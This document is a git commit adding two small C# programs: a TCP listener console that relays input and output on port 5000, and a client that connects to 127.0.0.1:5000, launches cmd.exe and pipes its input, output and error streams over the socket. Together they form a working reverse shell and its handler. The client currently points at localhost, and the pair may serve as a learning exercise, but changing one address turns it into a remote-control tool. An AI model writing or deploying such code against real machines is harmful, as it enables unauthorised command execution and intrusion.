16bcf23937726ab6b726fa745347fd3d6ff0d158
lukas <lukas-sinzing@gmx.de>
2023-06-23 17:17:24 +0200

    Projektdateien hinzufügen.

---
+++ Remote/Program.cs
@@ -0,0 +1,46 @@
+﻿using System.Net.Sockets;
+using System.Text;
+using System.Text.Unicode;
+
+namespace Remote
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            var server = new TcpListener(5000);
+
+            server.Start();
+            var sock = server.AcceptTcpClient();
+            var stream = sock.GetStream();
+
+            var r = new Thread(() =>
+            {
+                var buf = new byte[1024];
+                while (true)
+                {
+                    int c = stream.ReadAtLeast(buf, 1);
+                    Console.Write(System.Text.Encoding.UTF8.GetString(buf, 0, c));
+                }
+            });
+
+            var w = new Thread(() =>
+            {
+                var buf = new byte[1024];
+                while (true)
+                {
+                    var c = (char)Console.Read();
+                    while (c == -1) c = (char)Console.Read();
+
+                    stream.Write(Encoding.UTF8.GetBytes(c.ToString()));
+                }
+            });
+
+            r.Start();
+            w.Start();
+
+            while (true)
+                Thread.Sleep(1000);
+        }
+    }
+}
---
+++ SimpleRemoteShell/Program.cs
@@ -0,0 +1,60 @@
+﻿using System.Diagnostics;
+using System.Net.Sockets;
+
+namespace SimpleRemoteShell
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            var client = new TcpClient("127.0.0.1", 5000);
+            var stream = client.GetStream();
+            var proc = new Process();
+            proc.StartInfo.FileName = "cmd.exe";
+            proc.StartInfo.RedirectStandardInput = true;
+            proc.StartInfo.RedirectStandardOutput = true;
+            proc.StartInfo.UseShellExecute = false;
+            proc.StartInfo.RedirectStandardError = true;
+            proc.StartInfo.ArgumentList.Add("-i");
+            proc.Start();
+            
+            //proc.OutputDataReceived += (_, e) => stream.Write(System.Text.Encoding.UTF8.GetBytes(e.Data + "\n"));
+
+            //proc.BeginErrorReadLine();
+            //proc.BeginOutputReadLine();
+
+            var buf = new byte[1024];
+
+            var t = new Thread(
+                () =>
+                {
+                    var buf = new byte[1024];
+                    while (true)
+                    {
+                        int c = proc.StandardOutput.BaseStream.ReadAtLeast(buf, 1);
+                        stream.Write(buf, 0, c);
+                    }
+                });
+
+            var t2 = new Thread(
+                () =>
+                {
+                    var buf = new byte[1024];
+                    while (true)
+                    {
+                        int c = proc.StandardError.BaseStream.ReadAtLeast(buf, 1);
+                        stream.Write(buf, 0, c);
+                    }
+                });
+
+            t.Start();
+            t2.Start();
+
+            while (true)
+            {
+                var c = stream.ReadAtLeast(buf, 1);
+                proc.StandardInput.Write(buf.Select(x => (char)x).ToArray(), 0, c);
+            }
+        }
+    }
+}
